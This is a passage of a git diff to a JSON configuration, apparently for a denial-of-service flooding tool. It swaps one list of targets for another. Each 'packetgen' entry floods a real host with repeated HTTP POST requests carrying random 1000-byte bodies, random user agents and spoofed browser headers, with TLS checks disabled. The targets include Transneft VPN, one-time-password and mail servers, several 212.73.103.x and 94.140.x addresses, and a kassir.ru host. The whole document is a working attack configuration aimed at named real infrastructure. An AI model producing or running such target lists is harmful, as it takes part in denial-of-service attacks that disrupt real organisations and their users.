@@ -8,14 +8,55 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.122",
+            "count": 11,
+            "name": "http://anyconnect2.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.122:443",
+                        "address": "anyconnect2.kassir.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://anyconnect2.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://anyconnect2.kassir.ru",
+                                "Referer": "http://anyconnect2.kassir.ru",
+                                "X-Forwarded-Host": "anyconnect2.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "https://94.140.212.242",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.140.212.242:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -26,7 +67,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://212.73.103.122",
+                            "path": "https://94.140.212.242",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +80,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.122",
-                                "Referer": "https://212.73.103.122",
-                                "X-Forwarded-Host": "212.73.103.122",
+                                "Origin": "https://94.140.212.242",
+                                "Referer": "https://94.140.212.242",
+                                "X-Forwarded-Host": "94.140.212.242",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,1043 +93,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.205",
+            "count": 11,
+            "name": "tcp://94.140.213.21:993",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.205:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.205",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.205",
-                                "Referer": "https://212.73.103.205",
-                                "X-Forwarded-Host": "212.73.103.205",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://vpn03.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vpn03.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://vpn03.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://vpn03.transneft.ru",
-                                "Referer": "http://vpn03.transneft.ru",
-                                "X-Forwarded-Host": "vpn03.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.181",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.181:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.181",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.181",
-                                "Referer": "https://212.73.103.181",
-                                "X-Forwarded-Host": "212.73.103.181",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://otp.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "otp.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://otp.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://otp.transneft.ru",
-                                "Referer": "https://otp.transneft.ru",
-                                "X-Forwarded-Host": "otp.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.240",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.240:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.240",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.240",
-                                "Referer": "https://212.73.103.240",
-                                "X-Forwarded-Host": "212.73.103.240",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.204",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.204:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.204",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.204",
-                                "Referer": "https://212.73.103.204",
-                                "X-Forwarded-Host": "212.73.103.204",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://cp-vpn.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "cp-vpn.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://cp-vpn.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://cp-vpn.transneft.ru",
-                                "Referer": "http://cp-vpn.transneft.ru",
-                                "X-Forwarded-Host": "cp-vpn.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://oma-02.mb.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "oma-02.mb.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://oma-02.mb.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://oma-02.mb.transneft.ru",
-                                "Referer": "https://oma-02.mb.transneft.ru",
-                                "X-Forwarded-Host": "oma-02.mb.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://pumps.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "pumps.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://pumps.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://pumps.transneft.ru",
-                                "Referer": "https://pumps.transneft.ru",
-                                "X-Forwarded-Host": "pumps.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://212.73.103.233",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.233:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://212.73.103.233",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://212.73.103.233",
-                                "Referer": "http://212.73.103.233",
-                                "X-Forwarded-Host": "212.73.103.233",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.191",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.191:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.191",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.191",
-                                "Referer": "https://212.73.103.191",
-                                "X-Forwarded-Host": "212.73.103.191",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.135",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.135:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.135",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.135",
-                                "Referer": "https://212.73.103.135",
-                                "X-Forwarded-Host": "212.73.103.135",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.177",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.177:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.177",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.177",
-                                "Referer": "https://212.73.103.177",
-                                "X-Forwarded-Host": "212.73.103.177",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://pfo.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "pfo.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://pfo.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://pfo.transneft.ru",
-                                "Referer": "https://pfo.transneft.ru",
-                                "X-Forwarded-Host": "pfo.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://otp.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "otp.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://otp.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://otp.transneft.ru",
-                                "Referer": "http://otp.transneft.ru",
-                                "X-Forwarded-Host": "otp.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.114",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.114:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.114",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.114",
-                                "Referer": "https://212.73.103.114",
-                                "X-Forwarded-Host": "212.73.103.114",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.239",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.239:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.239",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.239",
-                                "Referer": "https://212.73.103.239",
-                                "X-Forwarded-Host": "212.73.103.239",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://vpn02.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vpn02.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://vpn02.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://vpn02.transneft.ru",
-                                "Referer": "http://vpn02.transneft.ru",
-                                "X-Forwarded-Host": "vpn02.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://vipmail.ak.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vipmail.ak.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://vipmail.ak.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://vipmail.ak.transneft.ru",
-                                "Referer": "https://vipmail.ak.transneft.ru",
-                                "X-Forwarded-Host": "vipmail.ak.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://dva.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "dva.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://dva.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://dva.transneft.ru",
-                                "Referer": "https://dva.transneft.ru",
-                                "X-Forwarded-Host": "dva.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://vpn01.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vpn01.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://vpn01.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://vpn01.transneft.ru",
-                                "Referer": "http://vpn01.transneft.ru",
-                                "X-Forwarded-Host": "vpn01.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://vpn.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vpn.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://vpn.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://vpn.transneft.ru",
-                                "Referer": "http://vpn.transneft.ru",
-                                "X-Forwarded-Host": "vpn.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://212.73.103.93",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.93:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://212.73.103.93",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://212.73.103.93",
-                                "Referer": "http://212.73.103.93",
-                                "X-Forwarded-Host": "212.73.103.93",
